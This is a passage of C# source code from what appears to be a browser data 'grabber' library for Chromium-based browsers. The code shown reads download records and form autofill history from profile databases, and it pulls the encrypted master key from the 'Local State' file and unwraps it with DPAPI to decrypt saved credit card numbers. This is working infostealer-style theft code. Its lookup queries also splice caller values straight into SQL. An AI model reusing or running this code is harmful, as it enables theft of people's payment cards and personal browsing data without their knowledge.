                                                break;
                                            case "Apr":
                                                month = 4;
                                                break;
                                            case "May":
                                                month = 5;
                                                break;
                                            default:
                                            case "Jun":
                                                month = 6;
                                                break;
                                            case "Jul":
                                                month = 7;
                                                break;
                                            case "Aug":
                                                month = 8;
                                                break;
                                            case "Sept":
                                                month = 9;
                                                break;
                                            case "Oct":
                                                month = 10;
                                                break;
                                            case "Nov":
                                                month = 11;
                                                break;
                                            case "Dec":
                                                month = 12;
                                                break;
                                        }

                                        lM = new DateTimeOffset(
                                            int.Parse(tS.Substring(12).Remove(4)), // year
                                            month, // month
                                            int.Parse(tS.Substring(5).Remove(2)), // day
                                            int.Parse(tS.Substring(17).Remove(2)), // hour
                                            int.Parse(tS.Substring(20).Remove(2)), // minute
                                            int.Parse(tS.Substring(23).Remove(2)), // second
                                            new TimeSpan(2, 0, 0)); // GMT (UTC+2) (idfk if it's **ALWAYS** GMT)
                                    }
                                }

                                downloads.Add(new Blink.Download()
                                {
                                    // Store retrieved information:
                                    Id = id,
                                    Guid = reader.GetString(1),
                                    CurrentPath = reader.GetString(2),
                                    TargetPath = tP,
                                    StartTime = Time.FromWebkitTimeMicroseconds(reader.GetInt64(4)),
                                    ReceivedBytes = reader.GetInt32(5),
                                    TotalBytes = reader.GetInt32(6),
                                    State = reader.GetInt16(7),
                                    DangerType = reader.GetInt16(8),
                                    InterruptReason = reader.GetInt16(9),
                                    Hash = (byte[])reader[10],
                                    EndTime = Time.FromWebkitTimeMicroseconds(reader.GetInt64(11)),
                                    IsOpened = reader.GetBoolean(12),
                                    LastAccessTime = Time.FromWebkitTimeMicroseconds(reader.GetInt64(13)),
                                    Transient = reader.GetInt32(14),
                                    Referrer = reader.GetString(15),
                                    SiteUrl = reader.GetString(16),
                                    TabUrl = reader.GetString(17),
                                    TabReferrerUrl = reader.GetString(18),
                                    HttpMethod = reader.GetString(19),
                                    ByExtId = reader.GetString(20),
                                    ByExtName = reader.GetString(21),
                                    Etag = reader.GetString(22),
                                    LastModified = lM,
                                    MimeType = reader.GetString(24),
                                    OriginalMimeType = reader.GetString(25),
                                    EmbedderDownloadData = eddExists ? reader.GetString(26) : string.Empty,

                                    Url = (string)_cmd.ExecuteScalar(),
                                    Filename = tP.Substring(tP.LastIndexOf('/') + 1), // Get the substring of the last '/'. Example: C:/Users/User/Downloads/File.zip = File.zip
                                });
                            }
                        }
                    }
                    conn.Close();
                }
                File.Delete(tempFile);
            });

            return downloads;
        }
        #endregion

        #region GetFormHistory()
        public IEnumerable<Blink.Form> GetFormHistoryBy(Blink.Form.Header by, object value)
        {
            List<Blink.Form> formHistory = new List<Blink.Form>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!AnyWebDataExists()) throw new GrabberException(GrabberError.FormHistoryNotFound, $"No form history databases were found!"); // Throw an Exception if no form history DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!WebDataExists(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + WebDataPath);

                using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    conn.Open();

                    cmd.CommandText = $"{FormDataQuery} WHERE {by} = '{value}'";

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            formHistory.Add(new Blink.Form()
                            {
                                // Store retrieved information:
                                Name = reader.GetString(0),
                                Value = reader.GetString(1),
                                ValueLower = reader.GetString(2),
                                DateCreated = Time.FromWebkitTimeSeconds(reader.GetInt32(3)),
                                DateLastUsed = Time.FromWebkitTimeSeconds(reader.GetInt32(4)),
                                Count = reader.GetInt32(5),
                            });
                        }
                    }
                    conn.Close();
                }
                File.Delete(tempFile);
            });

            return formHistory;
        }

        public IEnumerable<Blink.Form> GetFormHistory()
        {
            List<Blink.Form> formHistory = new List<Blink.Form>();
            if (!AnyWebDataExists()) throw new GrabberException(GrabberError.FormHistoryNotFound, $"No form history databases were found!"); // Throw an Exception if no form history DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!WebDataExists(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + WebDataPath);

                using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    conn.Open();

                    cmd.CommandText = FormDataQuery;

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            formHistory.Add(new Blink.Form()
                            {
                                // Store retrieved information:
                                Name = reader.GetString(0),
                                Value = reader.GetString(1),
                                ValueLower = reader.GetString(2),
                                DateCreated = Time.FromWebkitTimeSeconds(reader.GetInt32(3)),
                                DateLastUsed = Time.FromWebkitTimeSeconds(reader.GetInt32(4)),
                                Count = reader.GetInt32(5),
                            });
                        }
                    }
                    conn.Close();
                }
                File.Delete(tempFile);
            });

            return formHistory;
        }
        #endregion

        #region GetCreditCards()
        public IEnumerable<Blink.CreditCard> GetCreditCardsBy(Blink.CreditCard.Header by, object value) => GetCreditCardsBy(by, value, GetKey());
        public IEnumerable<Blink.CreditCard> GetCreditCardsBy(Blink.CreditCard.Header by, object value, byte[] key) => GetCreditCardsBy(by, value, new KeyParameter(key));
        public IEnumerable<Blink.CreditCard> GetCreditCardsBy(Blink.CreditCard.Header by, object value, KeyParameter key)
        {
            List<Blink.CreditCard> ccs = new List<Blink.CreditCard>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!AnyWebDataExists()) throw new GrabberException(GrabberError.CreditCardsNotFound, $"No credit card databases were found!"); // Throw an Exception if no cc DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!WebDataExists(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + WebDataPath);

                using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{CreditCardQuery} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            // Store retrieved information:
                            ccs.Add(new Blink.CreditCard()
                            {
                                Guid = reader.GetString(0),
                                NameOnCard = reader.GetString(1),
                                ExpirationMonth = reader.GetInt16(2),
                                ExpirationYear = reader.GetInt16(3),
                                CardNumberEncrypted = (byte[])reader[4],
                                CardNumberDecrypted = BlinkDecryptor.DecryptValue((byte[])reader[4], key),
                                DateModified = Time.FromUnixTimeSeconds(reader.GetInt64(5)),
                                Origin = reader.GetString(6),
                                UseCount = reader.GetInt32(7),
                                UseDate = Time.FromUnixTimeSeconds(reader.GetInt64(8)),
                                BillingAddressId = reader.GetString(9),
                                Nickname = reader.GetString(10),
                            });
                        }
                    }
                    conn.Close();
                }
                File.Delete(tempFile);
            });

            return ccs;
        }

        public IEnumerable<Blink.CreditCard> GetCreditCards() => GetCreditCards(GetKey());
        public IEnumerable<Blink.CreditCard> GetCreditCards(byte[] key) => GetCreditCards(new KeyParameter(key));
        public IEnumerable<Blink.CreditCard> GetCreditCards(KeyParameter key)
        {
            List<Blink.CreditCard> ccs = new List<Blink.CreditCard>();
            if (!AnyWebDataExists()) throw new GrabberException(GrabberError.CreditCardsNotFound, $"No credit card databases were found!"); // Throw an Exception if no cc DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!WebDataExists(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + WebDataPath);

                using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = CreditCardQuery;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            // Store retrieved information:
                            ccs.Add(new Blink.CreditCard()
                            {
                                Guid = reader.GetString(0),
                                NameOnCard = reader.GetString(1),
                                ExpirationMonth = reader.GetInt16(2),
                                ExpirationYear = reader.GetInt16(3),
                                CardNumberEncrypted = (byte[])reader[4],
                                CardNumberDecrypted = BlinkDecryptor.DecryptValue((byte[])reader[4], key),
                                DateModified = Time.FromUnixTimeSeconds(reader.GetInt64(5)),
                                Origin = reader.GetString(6),
                                UseCount = reader.GetInt32(7),
                                UseDate = Time.FromUnixTimeSeconds(reader.GetInt64(8)),
                                BillingAddressId = reader.GetString(9),
                                Nickname = reader.GetString(10),
                            });
                        }
                    }
                    conn.Close();
                }
                File.Delete(tempFile);
            });

            return ccs;
        }
        #endregion

        /// <summary>
        /// Returns the decrypted blink master key to decrypt encrypted BLOB database values
        /// </summary>
        public virtual byte[] GetKey()
        {
            if (!KeyExists()) throw new GrabberException(GrabberError.LocalStateNotFound, $"The file that stores the key for the decryption of encrypted values (Local State) could not be found: {LocalStatePath}"); // Throw an Exception if the "Local State" file that stores the key for decryption was not found

            // Get the encrypted master key from the "Local State" file with regular expressions:
            string value = Regex.Match(File.ReadAllText(LocalStatePath), "\"os_crypt\"\\s*:\\s*\\{\\s*.*?(?=\"encrypted_key)\"encrypted_key\"\\s*:\\s*\"(?<encKey>.*?)\"\\s*\\}").Groups["encKey"].Value; // Clean regex expression: \"os_crypt\"\s*:\s*\{\s*.*?(?=\"encrypted_key)\"encrypted_key\"\s*:\s*\"(?<encKey>.*?)\"\s*\}

            return DPAPI.Decrypt(Convert.FromBase64String(value).Skip(5).ToArray()); // Return decrypted key
        }
    }
}
